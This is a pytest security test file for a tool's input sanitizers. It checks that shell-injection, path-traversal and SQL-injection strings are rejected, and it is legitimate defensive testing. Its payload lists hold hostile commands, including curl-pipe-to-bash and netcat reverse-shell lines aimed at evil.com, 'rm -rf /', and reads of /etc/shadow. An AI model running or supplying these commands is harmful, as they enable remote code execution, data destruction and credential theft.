"""Security tests: ensure no command injection is possible through tool inputs.

These tests verify that shell metacharacters in all tool parameters are
rejected by the sanitizer BEFORE they can reach subprocess execution.
This is a defense-in-depth test — the primary protection is never using
shell=True, but we also validate inputs explicitly.
"""

from __future__ import annotations

import pytest

from tengu.exceptions import InvalidInputError
from tengu.security.sanitizer import (
    sanitize_cidr,
    sanitize_domain,
    sanitize_free_text,
    sanitize_hash,
    sanitize_port_spec,
    sanitize_target,
    sanitize_url,
)

# Common injection payloads an attacker might try to pass as parameters
SHELL_INJECTION_PAYLOADS = [
    "; ls -la",
    "& id",
    "| cat /etc/passwd",
    "`whoami`",
    "$(cat /etc/shadow)",
    "; rm -rf /tmp/*",
    "&& curl http://evil.com/shell.sh | bash",
    "|| id",
    "\n/bin/sh",
    "; nc -e /bin/sh evil.com 4444",
    "$(curl http://evil.com/malware -o /tmp/m && chmod +x /tmp/m && /tmp/m)",
    "> /dev/null; id",
    "1 --flag $(id)",
    "test' OR '1'='1",
    'test" OR "1"="1',
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/shadow",
    "..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]


class TestTargetInjection:
    @pytest.mark.parametrize("payload", SHELL_INJECTION_PAYLOADS)
    def test_target_rejects_injection(self, payload: str):
        """All shell injection payloads must be rejected by sanitize_target."""
        injected = f"192.168.1.1{payload}"
        with pytest.raises(InvalidInputError):
            sanitize_target(injected)

    @pytest.mark.parametrize("payload", SHELL_INJECTION_PAYLOADS)
    def test_domain_rejects_injection(self, payload: str):
        injected = f"example.com{payload}"
        with pytest.raises(InvalidInputError):
            sanitize_domain(injected)

    @pytest.mark.parametrize("payload", SHELL_INJECTION_PAYLOADS)
    def test_url_rejects_injection(self, payload: str):
        injected = f"https://example.com/{payload}"
        with pytest.raises(InvalidInputError):
            sanitize_url(injected)


class TestPortInjection:
    @pytest.mark.parametrize(
        "payload",
        [
            "80; ls",
            "80 && id",
            "80|cat /etc/passwd",
            "`id`",
            "$(id)",
        ],
    )
    def test_port_spec_rejects_injection(self, payload: str):
        with pytest.raises(InvalidInputError):
            sanitize_port_spec(payload)


class TestHashInjection:
    @pytest.mark.parametrize(
        "payload",
        [
            "d41d8cd98f00b204e9800998ecf8427e; rm -rf /",
            "abc$(id)",
            "abc`id`",
        ],
    )
    def test_hash_rejects_injection(self, payload: str):
        with pytest.raises(InvalidInputError):
            sanitize_hash(payload)


class TestFreeTextSanitization:
    """Free text queries are sanitized (metacharacters stripped), not rejected."""

    def test_shell_chars_removed(self):
        result = sanitize_free_text("apache; ls -la")
        assert ";" not in result

    def test_backtick_removed(self):
        result = sanitize_free_text("nginx`id`")
        assert "`" not in result

    def test_dollar_removed(self):
        result = sanitize_free_text("log4j$(id)")
        assert "$" not in result

    def test_legitimate_query_preserved(self):
        result = sanitize_free_text("apache log4j 2.14.1")
        assert "apache" in result
        assert "log4j" in result


class TestCIDRInjection:
    @pytest.mark.parametrize(
        "payload",
        [
            "192.168.1.0/24; rm -rf /",
            "192.168.1.0/24`id`",
            "192.168.1.0/24$(whoami)",
        ],
    )
    def test_cidr_rejects_injection(self, payload: str):
        with pytest.raises((InvalidInputError, ValueError)):
            sanitize_cidr(payload)


class TestSubprocessSafety:
    """Verify that process.run_command raises if shell=True is attempted.

    These tests check the executor layer directly.
    Note: We never use shell=True — these tests document and verify that fact.
    """

    @pytest.mark.asyncio
    async def test_command_list_not_string(self):
        """run_command always receives a list, never a shell string."""
        from tengu.exceptions import ToolNotFoundError
        from tengu.executor.process import run_command

        # A list with a non-existent tool raises ToolNotFoundError, not OSError
        # This confirms we're using exec, not shell
        with pytest.raises(ToolNotFoundError):
            await run_command(["definitely_nonexistent_tool_xyz"])

    @pytest.mark.asyncio
    async def test_empty_args_raises_valueerror(self):
        """Empty args list should raise ValueError immediately."""
        from tengu.executor.process import run_command

        with pytest.raises(ValueError):
            await run_command([])
